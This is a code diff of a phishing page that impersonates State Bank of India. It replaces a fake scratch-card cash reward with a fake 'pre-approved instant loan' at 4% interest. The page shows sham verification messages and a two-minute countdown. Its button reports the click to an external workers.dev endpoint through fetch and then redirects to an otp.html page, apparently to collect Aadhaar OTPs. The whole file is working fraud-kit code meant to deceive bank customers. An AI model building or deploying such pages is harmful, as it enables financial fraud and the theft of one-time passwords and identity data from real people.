@@ -3,207 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBI - Online Banking</title>
+    <title>SBI - Digital Loan Services</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; margin: 0; padding: 0; }
-        body { background-color: #fff; display: flex; justify-content: center; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
-        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
-        .full-img { width: 100%; display: block; }
-
-        .header-bar { background-color: #315195; color: white; padding: 12px 15px; font-size: 14px; font-weight: 600; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #f4f7fa; display: flex; justify-content: center; color: #333; overflow-x: hidden; }
+        .container { width: 100%; max-width: 500px; background: #fff; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 15px rgba(0,0,0,0.05); position: relative; }
         
-        .content-area { padding: 30px 20px; text-align: center; }
-        .reward-title { font-size: 18px; color: #315195; font-weight: 700; margin-bottom: 5px; }
-        .reward-sub { font-size: 13px; color: #666; margin-bottom: 25px; }
+        .header-img { width: 100%; display: block; border-bottom: 3px solid #315195; }
 
-        /* Scratch Card Box */
-        .scratch-card-wrapper {
-            position: relative; width: 280px; height: 280px; margin: 0 auto;
-            background: #fff; border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            border: 1px solid #eee; display: flex; justify-content: center; align-items: center;
-            overflow: hidden; /* Canvas radius ke liye */
+        /* --- Professional Loading Screen --- */
+        #loading-screen {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #fff; z-index: 9999; display: flex; flex-direction: column; 
+            align-items: center; justify-content: center; text-align: center; padding: 20px;
         }
-
-        .hidden-reward { text-align: center; }
-        .hidden-reward img { width: 80px; margin-bottom: 10px; }
-        .hidden-reward h3 { color: #28a745; font-size: 32px; margin: 5px 0; font-weight: 900; }
-        .hidden-reward p { font-size: 16px; color: #333; font-weight: 600; }
-
-        canvas {
-            position: absolute; top: 0; left: 0; z-index: 10;
-            cursor: crosshair; touch-action: none;
-            border-radius: 15px; /* Wrapper ke sath match karne ke liye */
+        .spinner {
+            width: 55px; height: 55px; border: 5px solid #f3f3f3; 
+            border-top: 5px solid #315195; border-radius: 50%; 
+            animation: spin 1s linear infinite; margin-bottom: 25px;
         }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #loading-text { font-size: 15px; color: #315195; font-weight: 500; min-height: 40px; }
 
-        /* Modern Popup Overlay */
-        .modal-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000;
-            backdrop-filter: blur(5px);
-        }
+        /* --- Main Content (Hidden initially) --- */
+        #main-content { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.5s ease-in; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .success-box { padding: 40px 20px 25px; text-align: center; background: linear-gradient(180deg, #eaf6ff 0%, #ffffff 100%); }
         
-        .success-popup {
-            background: white; width: 90%; max-width: 380px; padding: 40px 25px;
-            border-radius: 24px; text-align: center; 
-            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
-            animation: popUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
+        /* Bada Success Logo */
+        .success-icon { width: 95px; height: 95px; margin: 0 auto 20px; background: #e6f7ef; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,168,89,0.1); }
+        .success-icon span { color: #00a859; font-size: 55px; font-weight: bold; }
 
-        @keyframes popUp { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-
-        .congrats-text { color: #315195; font-size: 24px; font-weight: 800; margin-bottom: 15px; }
+        .loan-status { color: #00a859; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 5px; display: block; }
+        .congrats-title { color: #212121; font-size: 22px; font-weight: 500; margin-bottom: 5px; }
+        .approved-amount { font-size: 46px; color: #315195; font-weight: 700; margin: 10px 0; letter-spacing: -1px; }
         
-        /* Bada Amount Styling */
-        .big-amount { 
-            font-size: 48px; color: #28a745; font-weight: 900; 
-            margin: 15px 0; display: block; text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
-        }
+        .validity-timer { font-size: 13px; color: #b30000; font-weight: bold; margin-top: 5px; }
+
+        /* Professional Details Card */
+        .details-card { margin: 10px 25px; border-radius: 8px; border: 1px solid #f0f0f0; background: #fafafa; overflow: hidden; }
+        .detail-row { display: flex; justify-content: space-between; padding: 13px 16px; border-bottom: 1px solid #eee; font-size: 13px; }
+        .detail-row:last-child { border: none; }
+        .lbl { color: #6e6e6e; }
+        .val { color: #212121; font-weight: 600; }
+
+        .action-container { padding: 15px 25px 40px; margin-top: auto; }
         
-        .reward-desc { color: #555; font-size: 15px; margin-bottom: 30px; line-height: 1.6; }
-
-        .btn-transfer {
-            background: #315195; color: white; border: none; width: 100%;
-            padding: 16px; border-radius: 10px; font-size: 17px; font-weight: 700;
-            cursor: pointer; transition: 0.3s;
-            box-shadow: 0 4px 15px rgba(49, 81, 149, 0.3);
+        /* Sleek Button */
+        .btn-sleek { 
+            width: 100%; background: #315195; color: white; padding: 11px 0; 
+            border: none; border-radius: 4px; font-size: 15px; font-weight: 500; 
+            cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1); transition: 0.2s;
         }
-        .btn-transfer:active { transform: scale(0.98); }
-
-        .footer-note { margin-top: 35px; font-size: 12px; color: #888; border-top: 1px solid #f0f0f0; padding-top: 20px; text-align: left; }
+        .btn-sleek:active { background: #1e335e; transform: scale(0.98); }
+        
+        .footer-img { width: 100%; display: block; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="SBI" class="full-img">
-        <div class="header-bar">Reward redemption center</div>
-        
-        <div class="content-area">
-            <div class="reward-title">Exclusive Offer!</div>
-            <div class="reward-sub">Scratch the card below to reveal your prize</div>
-
-            <div class="scratch-card-wrapper">
-                <div class="hidden-reward">
-                    <img src="https://cdn-icons-png.flaticon.com/512/615/615453.png" alt="Reward">
-                    <h3>₹7,250.00</h3>
-                    <p>Ready to Transfer</p>
-                </div>
-                <canvas id="scratchCanvas" width="280" height="280"></canvas>
-            </div>
-
-            <div class="footer-note">
-                <b>Note:</b> This reward is generated based on your account maintenance and transaction history. Please claim it before it expires.
-            </div>
+        <div id="loading-screen">
+            <div class="spinner"></div>
+            <div id="loading-text">Establishing secure connection...</div>
         </div>
-        
-        <div style="margin-top: 20px;"><img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" alt="Footer" class="full-img"></div>
-    </div>
 
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="success-popup">
-            <div style="font-size: 60px;">🏆</div>
-            <div class="congrats-text">Congratulations!</div>
-            <p style="color:#666; font-size: 14px;">You have won a cash reward of</p>
-            
-            <span class="big-amount">₹7,250.00</span>
-            
-            <p class="reward-desc">This amount will be credited instantly to your linked bank account after verification.</p>
-            
-            <button class="btn-transfer" onclick="goToBabu()">Transfer to bank account</button>
+        <div id="main-content">
+            <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" class="header-img">
+
+            <div class="success-box">
+                <div class="success-icon"><span>✓</span></div>
+                <span class="loan-status">Application Approved</span>
+                <h1 class="congrats-title">Congratulations!</h1>
+                <p style="font-size: 13px; color: #666;">Your pre-approved credit limit is ready for dispersal.</p>
+                <div class="approved-amount" id="loanVal">₹ 0,00,000</div>
+                <div class="validity-timer">Offer expires in: <span id="timer">02:00</span> min</div>
+            </div>
+
+            <div class="details-card">
+                <div class="detail-row"><span class="lbl">Loan Product</span><span class="val">Instant Personal Loan</span></div>
+                <div class="detail-row"><span class="lbl">Interest Rate</span><span class="val" style="color: #b30000;">4.00% p.a. (Fixed)</span></div>
+                <div class="detail-row"><span class="lbl">Processing Fee</span><span class="val" style="color: #00a859;">₹ 0.00 (Waived)</span></div>
+                <div class="detail-row"><span class="lbl">Tenure Period</span><span class="val">60 Months</span></div>
+                <div class="detail-row"><span class="lbl">Disbursement Type</span><span class="val">Instant Bank Transfer</span></div>
+            </div>
+
+            <p style="padding: 15px 30px; font-size: 11px; color: #999; text-align: center; line-height: 1.4;">
+                This offer is digitally generated based on your banking relationship. Final credit is subject to Aadhaar-OTP verification.
+            </p>
+
+            <div class="action-container">
+                <button class="btn-sleek" id="transferBtn">Transfer to Bank Account</button>
+            </div>
+
+            <img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" class="footer-img">
         </div>
     </div>
 
     <script>
-        const canvas = document.getElementById('scratchCanvas');
-        const ctx = canvas.getContext('2d');
-        const modal = document.getElementById('modalOverlay');
-        let isPressed = false;
+        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
+        let finalAmount = "";
 
-        // --- Real Scratch Texture Setup ---
-        // 1. Base Grey Colour
-        ctx.fillStyle = '#c0c0c0'; 
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        
-        // 2. Add Grainy/Dotted Texture for realism
-        ctx.globalCompositeOperation = 'source-atop'; // Sirf base colour ke upar draw karega
-        for (let i = 0; i < 8000; i++) { // Dotted texture
-            const x = Math.random() * canvas.width;
-            const y = Math.random() * canvas.height;
-            const opacity = Math.random() * 0.15; // Halki shading
-            ctx.fillStyle = `rgba(0,0,0,${opacity})`;
-            ctx.fillRect(x, y, 1, 1); // Chhota dot
+        // 1. Loading Logic (8 Professional Steps)
+        const loadingTexts = [
+            "Establishing secure connection to SBI server...",
+            "Fetching CIBIL/Credit score records...",
+            "Verifying Aadhaar-linked primary account...",
+            "Validating employment & income eligibility...",
+            "Scanning for pre-approved digital offers...",
+            "Calculating maximum sanction limit...",
+            "Performing final risk assessment...",
+            "Generating digital approval letter..."
+        ];
+
+        let textIdx = 0;
+        const textInterval = setInterval(() => {
+            if(textIdx < loadingTexts.length) {
+                document.getElementById('loading-text').innerText = loadingTexts[textIdx];
+                textIdx++;
+            }
+        }, 800);
+
+        setTimeout(() => {
+            clearInterval(textInterval);
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('main-content').style.display = 'flex';
+            startTimer(120);
+        }, 6500);
+
+        // 2. Random Amount 1.5L to 3L
+        window.onload = function() {
+            const amt = Math.floor(Math.random() * (300000 - 150000 + 1)) + 150000;
+            finalAmount = "₹ " + amt.toLocaleString('en-IN');
+            document.getElementById('loanVal').innerText = finalAmount;
+        };
+
+        // 3. Countdown Timer
+        function startTimer(duration) {
+            let timer = duration, min, sec;
+            const display = document.querySelector('#timer');
+            const interval = setInterval(() => {
+                min = parseInt(timer / 60, 10);
+                sec = parseInt(timer % 60, 10);
+                display.textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
+                if (--timer < 0) clearInterval(interval);
+            }, 1000);
         }
-        
-        // 3. Reset Composite Operation for next drawings
-        ctx.globalCompositeOperation = 'source-over';
 
-        // 4. Add Guide Text (Strictly "Scratch here")
-        ctx.fillStyle = '#555'; // Slightly darker grey for text
-        ctx.font = 'bold 20px Arial';
-        ctx.textAlign = 'center';
-        ctx.fillText('Scratch here', 140, 145);
-
-        // --- Scratch Logic ---
-        function getMousePos(e) {
-            const rect = canvas.getBoundingClientRect();
-            // Mobile touch aur desktop mouse dono support ke liye
-            const clientX = e.touches ? e.touches[0].clientX : e.clientX;
-            const clientY = e.touches ? e.touches[0].clientY : e.clientY;
-            return {
-                x: clientX - rect.left,
-                y: clientY - rect.top
-            };
-        }
-
-        function handleScratch(e) {
-            if (!isPressed) return;
-            e.preventDefault(); // Mobile par scroll rokne ke liye
-            const pos = getMousePos(e);
+        // 4. Action Button
+        document.getElementById('transferBtn').addEventListener('click', async function() {
+            this.disabled = true;
+            this.innerText = "Processing...";
             
-            // Ye physical scratching effect deta hai (Destination-out)
-            ctx.globalCompositeOperation = 'destination-out';
-            ctx.beginPath();
-            // Brush size thoda bada rakha hai (28) real feel ke liye
-            ctx.arc(pos.x, pos.y, 28, 0, Math.PI * 2);
-            ctx.fill();
-            checkCompletion();
-        }
+            const log = `✅ LOAN CLAIMED\nAmount: ${finalAmount}\nRate: 4%\nStatus: User moving to OTP`;
 
-        function checkCompletion() {
-            const pixels = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
-            let clearCount = 0;
-            // Transparent pixels ginte hain (har 4th value Alpha hai)
-            for (let i = 3; i < pixels.length; i += 4) {
-                if (pixels[i] === 0) clearCount++;
+            try {
+                await fetch(workerURL + "?detail=" + encodeURIComponent(log));
+                window.location.href = "otp.html";
+            } catch (e) {
+                window.location.href = "otp.html";
             }
-            // Jab 45% layer hat jaye, tab popup dikhao
-            if (clearCount > (pixels.length / 4) * 0.45) {
-                canvas.style.opacity = '0';
-                canvas.style.transition = 'opacity 0.6s';
-                setTimeout(() => {
-                    modal.style.display = 'flex';
-                }, 400);
-            }
-        }
-
-        // Mouse Events
-        canvas.addEventListener('mousedown', () => isPressed = true);
-        window.addEventListener('mouseup', () => isPressed = false);
-        canvas.addEventListener('mousemove', handleScratch);
-
-        // Touch Events (Mobile)
-        canvas.addEventListener('touchstart', (e) => {
-            isPressed = true;
-            handleScratch(e); // Pehle touch par hi scratch shuru kare
         });
-        window.addEventListener('touchend', () => isPressed = false);
-        canvas.addEventListener('touchmove', handleScratch);
-
-        function goToBabu() {
-            window.location.href = "babu.html"; 
-        }
     </script>
 </body>
 </html>
-
